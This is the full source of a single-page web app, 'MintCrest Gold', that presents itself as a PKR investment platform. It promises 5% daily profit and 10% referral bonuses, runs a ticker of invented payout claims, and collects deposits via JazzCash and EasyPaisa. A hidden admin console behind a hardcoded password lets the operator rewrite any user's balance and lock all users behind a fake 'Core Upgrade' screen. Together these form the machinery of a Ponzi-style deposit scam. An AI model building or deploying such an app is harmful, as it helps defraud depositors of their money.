<!DOCTYPE html>
<html lang="en" id="main-html" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <title>MintCrest Gold | Ultimate Node</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --bg: #010409; --card: #0d1117; --text: #f0f6fc; --border: #30363d; --blue: #2f81f7; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: var(--text); overflow-x: hidden; }
        .glass { background: var(--card); border: 1px solid var(--border); border-radius: 16px; }
        .page { display: none; animation: fadeIn 0.4s ease-out; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        input { background: #161b22; border: 1px solid var(--border); color: white; padding: 14px; border-radius: 12px; width: 100%; outline: none; margin-bottom: 10px; font-size: 14px; transition: 0.3s; }
        input:focus { border-color: var(--blue); box-shadow: 0 0 10px rgba(47, 129, 247, 0.2); }
        .btn-prime { background: linear-gradient(135deg, #2f81f7, #1e40af); color: white; font-weight: 800; border-radius: 12px; cursor: pointer; border: none; padding: 16px; width: 100%; font-size: 12px; text-transform: uppercase; letter-spacing: 1px; }
        .ticker-wrap { background: #010409; border-bottom: 1px solid var(--border); padding: 8px 0; overflow: hidden; position: sticky; top: 0; z-index: 6000; }
        .ticker { display: inline-block; white-space: nowrap; animation: marquee 40s linear infinite; font-size: 10px; font-weight: 800; color: #2f81f7; text-transform: uppercase; }
        @keyframes marquee { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
        #toast { visibility: hidden; min-width: 250px; background: #2f81f7; color: #fff; text-align: center; border-radius: 8px; padding: 16px; position: fixed; z-index: 20000; left: 50%; transform: translateX(-50%); bottom: 100px; font-size: 12px; font-weight: 800; box-shadow: 0 10px 40px rgba(0,0,0,0.6); }
        #toast.show { visibility: visible; animation: slideUp 0.5s, slideDown 0.5s 2.5s; }
        @keyframes slideUp { from {bottom: 0; opacity: 0;} to {bottom: 100px; opacity: 1;} }
        @keyframes slideDown { from {bottom: 100px; opacity: 1;} to {bottom: 0; opacity: 0;} }
        .wa-float { position: fixed; bottom: 110px; right: 20px; background: #25d366; color: white; width: 55px; height: 55px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 28px; box-shadow: 0 5px 20px rgba(0,0,0,0.4); z-index: 4500; }
    </style>
</head>
<body onclick="handleGlobalClick()">

    <div id="toast">SYSTEM INITIALIZED</div>

    <div class="ticker-wrap">
        <div class="ticker">
            &bull; User @Master786 withdrawn PKR 12,500 via JazzCash &bull; Daily Profit of 5% credited to all active nodes &bull; New Diamond Plan deployed by @EliteTrader &bull; System Status: Fully Optimized &bull; Secure Encrypted Payouts Enabled
        </div>
    </div>

    <div id="lock-screen" class="fixed inset-0 z-[1000000] bg-[#010409] hidden flex flex-col items-center justify-center p-10 text-center">
        <div class="w-16 h-16 border-4 border-blue-500 border-t-transparent rounded-full animate-spin mb-8"></div>
        <h1 class="text-2xl font-black text-blue-500 mb-3 uppercase tracking-[5px]">Core Upgrade</h1>
        <p class="text-[10px] font-bold opacity-40 uppercase tracking-[3px] leading-relaxed">System nodes are being synchronized for maximum yield.</p>
    </div>

    <header class="p-5 flex justify-between items-center bg-[#010409]/95 backdrop-blur-lg border-b border-white/5 sticky top-[36px] z-[5000]">
        <div class="flex items-center gap-4">
            <div onclick="triggerAdmin()" class="w-11 h-11 bg-blue-600 rounded-xl flex items-center justify-center text-white font-black text-xl shadow-lg shadow-blue-500/30 cursor-pointer">M</div>
            <div>
                <h1 class="text-[13px] font-black uppercase tracking-tight">MINTCREST <span class="text-blue-500">GOLD</span></h1>
                <p id="node-id" class="text-[8px] font-bold opacity-50 uppercase text-blue-400 tracking-widest">Scanning...</p>
            </div>
        </div>
        <div id="top-bal" class="bg-blue-600/10 px-5 py-2.5 rounded-xl border border-blue-500/20 text-blue-500 text-[12px] font-black italic tracking-tighter">PKR 0.00</div>
    </header>

    <main id="main-ui" class="hidden p-6 space-y-7 pb-32">
        
        <div id="p-home" class="page active-page space-y-7">
            <div class="glass p-8 bg-gradient-to-br from-blue-900 via-[#0d1117] to-[#010409] border-blue-500/10 relative overflow-hidden">
                <div class="absolute -right-12 -top-12 w-40 h-40 bg-blue-500/10 rounded-full blur-3xl"></div>
                <p class="text-[10px] font-bold opacity-40 uppercase tracking-[2px]">Total Portfolio Value</p>
                <h2 class="text-5xl font-black tracking-tighter mt-2 italic" id="bal-main">PKR 0</h2>
                <div class="mt-10 flex gap-4">
                    <button onclick="changePage('deposit')" class="flex-1 py-4 bg-blue-500 text-white rounded-2xl font-black text-[11px] uppercase shadow-xl shadow-blue-500/20 transition active:scale-95">Add Asset</button>
                    <button onclick="changePage('withdraw')" class="flex-1 py-4 bg-white/5 border border-white/10 rounded-2xl font-black text-[11px] uppercase active:scale-95">Withdraw</button>
                </div>
            </div>
            
            <div id="plans-list" class="space-y-4"></div>
        </div>

        <div id="p-team" class="page space-y-7">
            <div class="glass p-7 text-center border-l-4 border-blue-500">
                <p class="text-[10px] font-bold opacity-40 uppercase mb-3">Referral Link (Earn 10%)</p>
                <div class="flex items-center gap-3 bg-white/5 p-4 rounded-2xl border border-white/5">
                    <p id="ref-txt" class="text-[11px] font-bold text-blue-500 break-all flex-1 text-left">Generating...</p>
                    <button onclick="copyRef()" class="text-blue-500 text-xl active:scale-90"><i class="fa-solid fa-copy"></i></button>
                </div>
            </div>
            <div class="grid grid-cols-2 gap-5">
                <div class="glass p-6 text-center shadow-lg"><h4 id="team-size" class="text-3xl font-black">0</h4><p class="text-[9px] opacity-40 uppercase font-bold mt-1 tracking-widest">Active Nodes</p></div>
                <div class="glass p-6 text-center shadow-lg"><h4 id="team-earn" class="text-3xl font-black text-green-500">PKR 0</h4><p class="text-[9px] opacity-40 uppercase font-bold mt-1 tracking-widest">Commission</p></div>
            </div>
        </div>

        <div id="p-deposit" class="page space-y-7">
            <div id="gateways" class="space-y-3"></div>
            <div class="glass p-7 space-y-5">
                <input type="number" id="d-amt" placeholder="Deposit Amount">
                <input type="text" id="d-tid" placeholder="Transaction ID (TID)">
                <div class="text-[9px] font-bold opacity-40 uppercase text-center">Attach Receipt Screenshot</div>
                <input type="file" id="d-img" class="text-[11px] border-2 border-dashed border-white/10 py-6 text-center cursor-pointer">
                <button onclick="sendDeposit()" class="btn-prime">Verify Asset Transfer</button>
            </div>
        </div>

        <div id="p-withdraw" class="page space-y-7">
            <div class="glass p-7 space-y-5">
                <input type="number" id="w-amt" placeholder="Min Payout: 500">
                <input type="text" id="w-acc" placeholder="Account Number">
                <input type="text" id="w-name" placeholder="Account Title">
                <button onclick="sendWithdraw()" class="w-full py-4 bg-red-600/10 text-red-500 border border-red-500/20 rounded-2xl font-black text-[11px] uppercase">Request Payout</button>
            </div>
        </div>
    </main>

    <div id="admin-ui" class="fixed inset-0 bg-[#010409] z-[100000] hidden overflow-y-auto p-7 pb-40">
        <div class="flex justify-between items-center mb-10 border-b border-white/5 pb-5">
            <h2 class="text-xl font-black text-blue-500 italic uppercase tracking-wider">God Console</h2>
            <button onclick="closeAdmin()" class="bg-white/5 px-6 py-2 rounded-xl text-[10px] font-bold uppercase">Exit</button>
        </div>

        <button onclick="toggleLock()" id="lock-btn" class="w-full py-4 mb-6 rounded-2xl font-black text-[11px] uppercase tracking-[2px]">System: --</button>
        
        <div class="grid grid-cols-2 gap-5 mb-10">
            <div class="glass p-6 text-center"><h4 id="adm-users" class="text-3xl font-black">0</h4><p class="text-[9px] opacity-40 uppercase font-bold">Total Users</p></div>
            <div class="glass p-6 text-center"><h4 id="adm-reqs" class="text-3xl font-black text-blue-500">0</h4><p class="text-[9px] opacity-40 uppercase font-bold">Pending</p></div>
        </div>

        <div id="req-queue" class="space-y-5"></div>

        <div class="glass p-7 mt-10 border-l-4 border-purple-500">
            <h4 class="text-[11px] font-black uppercase text-purple-500 mb-5">Force Balance Edit</h4>
            <input id="adm-target" placeholder="Username (Case Sensitive)">
            <input id="adm-bal" type="number" placeholder="New Balance">
            <button onclick="forceEdit()" class="w-full py-4 bg-purple-600 rounded-2xl font-black text-[11px] uppercase">Update Database</button>
        </div>
    </div>

    <a href="https://wa.me/923705519562" class="wa-float" target="_blank"><i class="fa-brands fa-whatsapp"></i></a>

    <nav id="nav" class="hidden fixed bottom-0 w-full glass bg-[#0d1117]/98 border-t border-white/5 p-7 flex justify-around items-center z-[5000] rounded-t-[35px] shadow-[0_-10px_40px_rgba(0,0,0,0.5)]">
        <button onclick="changePage('home')" class="opacity-40 transition-all"><i class="fa-solid fa-house-crack text-2xl"></i></button>
        <button onclick="changePage('team')" class="opacity-40 transition-all"><i class="fa-solid fa-users-rays text-2xl"></i></button>
        <button onclick="changePage('deposit')" class="opacity-40 transition-all"><i class="fa-solid fa-wallet text-2xl"></i></button>
        <button onclick="changePage('withdraw')" class="opacity-40 transition-all"><i class="fa-solid fa-hand-holding-dollar text-2xl"></i></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        let user = null; let clickA = 0; let clickB = 0; let mStatus = false;

        // --- ADMIN GOD MODE ---
        function triggerAdmin() { clickA++; if(clickA >= 5) { if(prompt("Access Key:")==="mint786") { document.getElementById('admin-ui').classList.remove('hidden'); syncAdmin(); } clickA=0; } }
        function closeAdmin() { document.getElementById('admin-ui').classList.add('hidden'); }
        function handleGlobalClick() {
            if(!document.getElementById('lock-screen').classList.contains('hidden')) {
                clickB++; if(clickB >= 5) { if(prompt("Bypass Key:")==="mint786") { document.getElementById('lock-screen').classList.add('hidden'); document.getElementById('admin-ui').classList.remove('hidden'); syncAdmin(); } clickB=0; }
            }
        }

        async function syncAdmin() {
            db.collection("users").onSnapshot(s => document.getElementById('adm-users').innerText = s.size);
            db.collection("requests").where("status","==","pending").onSnapshot(s => {
                document.getElementById('adm-reqs').innerText = s.size;
                const q = document.getElementById('req-queue'); q.innerHTML = '';
                s.forEach(doc => {
                    const r = doc.data();
                    q.innerHTML += `<div class="glass p-6 border-l-4 border-blue-500 text-[11px] font-bold uppercase">
                        <p class="mb-3 text-blue-400 font-black">${r.type} Request | ${r.user}</p>
                        <p class="mb-4">Amount: PKR ${r.amount.toLocaleString()}</p>
                        ${r.proof ? `<img src="${r.proof}" class="w-full rounded-2xl mb-5 shadow-2xl">` : ''}
                        <div class="flex gap-3">
                            <button onclick="approveReq('${doc.id}','${r.user}',${r.amount},'${r.type}')" class="flex-1 py-4 bg-green-600 rounded-xl">Approve</button>
                            <button onclick="db.collection('requests').doc('${doc.id}').update({status:'rejected'})" class="flex-1 py-4 bg-red-600 rounded-xl opacity-50">Reject</button>
                        </div>
                    </div>`;
                });
            });
            db.collection("settings").doc("system").onSnapshot(d => {
                mStatus = d.data()?.maintenance;
                const b = document.getElementById('lock-btn');
                b.innerText = "SYSTEM LOCK: " + (mStatus ? "ACTIVE" : "OFF");
                b.className = mStatus ? "w-full py-4 bg-red-600/10 text-red-500 border border-red-500/20 rounded-2xl font-black text-[11px] uppercase tracking-[2px]" : "w-full py-4 bg-green-600/10 text-green-500 border border-green-500/20 rounded-2xl font-black text-[11px] uppercase tracking-[2px]";
            });
        }

        async function approveReq(id, u, a, type) {
            if(type === 'Deposit') {
                await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(a), active: true });
                // Referral logic (10%)
                const snap = await db.collection("users").doc(u).get();
                if(snap.data().refBy && snap.data().refBy !== 'Direct') {
                    await db.collection("users").doc(snap.data().refBy).update({ balance: firebase.firestore.FieldValue.increment(a * 0.10) });
                }
            } else {
                await db.collection("users").doc(u).update({ balance: firebase.firestore.FieldValue.increment(-a) });
            }
            await db.collection("requests").doc(id).update({ status: 'approved' });
            showToast("AUTHORIZED");
        }

        async function forceEdit() {
            const u = document.getElementById('adm-target').value;
            const b = Number(document.getElementById('adm-bal').value);
            await db.collection("users").doc(u).update({ balance: b });
            showToast("DATA OVERRIDDEN");
        }

        async function toggleLock() { await db.collection("settings").doc("system").set({ maintenance: !mStatus }); }

        // --- AUTOMATED DAILY PROFIT ---
        async function runAutoProfit(id, data) {
            const now = Date.now();
            const last = data.lastYield || 0;
            const day = 24 * 60 * 60 * 1000;

            if (data.active && (now - last) >= day) {
                const profit = Math.floor(data.balance * 0.05); // 5% Daily Profit
                if (profit > 0) {
                    await db.collection("users").doc(id).update({
                        balance: firebase.firestore.FieldValue.increment(profit),
                        lastYield: now
                    });
                    showToast(`+PKR ${profit} PROFIT CREDITED`);
                }
            }
        }

        // --- USER CORE ---
        function syncUser(id) {
            db.collection("users").doc(id).onSnapshot(async d => {
                user = d.data();
                if(!user) return;
                await runAutoProfit(id, user);

                const b = (user.balance || 0).toLocaleString(undefined, {minimumFractionDigits: 2});
                document.getElementById('bal-main').innerText = "PKR " + b;
                document.getElementById('top-bal').innerText = "PKR " + b;
                document.getElementById('ref-txt').innerText = window.location.origin + "/?ref=" + id;

                db.collection("users").where("refBy","==",id).onSnapshot(s => {
                    document.getElementById('team-size').innerText = s.size;
                    let bns = 0; s.forEach(doc => bns += (doc.data().balance * 0.1));
                    document.getElementById('team-earn').innerText = "PKR " + Math.floor(bns).toLocaleString();
                });
            });

            db.collection("settings").doc("system").onSnapshot(d => {
                if(d.data()?.maintenance && id !== 'admin') document.getElementById('lock-screen').classList.remove('hidden');
                else document.getElementById('lock-screen').classList.add('hidden');
            });

            db.collection("plans").orderBy("price","asc").onSnapshot(s => {
                const list = document.getElementById('plans-list'); list.innerHTML = '';
                s.forEach(doc => {
                    const p = doc.data();
                    list.innerHTML += `<div class="glass p-7 border-l-4 border-blue-500 flex justify-between items-center transition active:scale-95">
                        <div><p class="text-[9px] font-black opacity-30 uppercase tracking-widest">${p.name}</p><h4 class="text-2xl font-black">PKR ${p.price.toLocaleString()}</h4><p class="text-[10px] text-green-500 font-bold mt-1">Daily Yield: PKR ${p.dailyProfit}/Day</p></div>
                        <button onclick="changePage('deposit')" class="bg-blue-600 px-7 py-4 rounded-2xl font-black text-[10px] shadow-lg shadow-blue-500/20">ACTIVATE</button>
                    </div>`;
                });
            });

            db.collection("settings").doc("gateways").onSnapshot(d => {
                const g = d.data();
                document.getElementById('gateways').innerHTML = `
                    <div class="p-5 glass flex justify-between text-[12px] font-black border-l-4 border-yellow-500"><span>JazzCash Node</span><span>${g.jazz}</span></div>
                    <div class="p-5 glass flex justify-between text-[12px] font-black border-l-4 border-green-500"><span>EasyPaisa Node</span><span>${g.easy}</span></div>`;
            });
        }

        async function sendDeposit() {
            const a = Number(document.getElementById('d-amt').value); const t = document.getElementById('d-tid').value; const img = document.getElementById('d-img').files[0];
            if(!a || !t || !img) return alert("Security Error: Missing Verification Proof");
            const reader = new FileReader(); reader.readAsDataURL(img);
            reader.onload = async () => {
                await db.collection("requests").add({ user: user.name, amount: a, tid: t, proof: reader.result, type: 'Deposit', status: 'pending', time: Date.now() });
                showToast("NODE PENDING AUDIT"); changePage('home');
            };
        }

        async function sendWithdraw() {
            const a = Number(document.getElementById('w-amt').value); const acc = document.getElementById('w-acc').value; const n = document.getElementById('w-name').value;
            if(a < 500 || !acc || !n) return alert("Payout Error: Minimum 500 & Full Data Required");
            if(a > user.balance) return alert("Liquidity Error: Insufficient Node Balance");
            await db.collection("requests").add({ user: user.name, amount: a, account: acc, title: n, type: 'Withdraw', status: 'pending', time: Date.now() });
            showToast("PAYOUT REQUESTED"); changePage('home');
        }

        // UTILITIES
        function showToast(m) { const t = document.getElementById("toast"); t.innerText = m; t.className = "show"; setTimeout(()=>t.className="", 3000); }
        function changePage(p) { 
            document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); 
            document.getElementById('p-'+p).classList.add('active-page');
            document.querySelectorAll('nav button').forEach(b => b.classList.add('opacity-40'));
        }
        function copyRef() { navigator.clipboard.writeText(document.getElementById('ref-txt').innerText); showToast("LINK SECURED"); }
        
        window.onload = () => { 
            const session = localStorage.getItem('mc_session');
            if(session) {
                document.getElementById('node-id').innerText = "NODE-ID: " + session.toUpperCase();
                document.getElementById('main-ui').classList.remove('hidden');
                document.getElementById('nav').classList.remove('hidden');
                syncUser(session);
            }
        }
    </script>
</body>
</html>
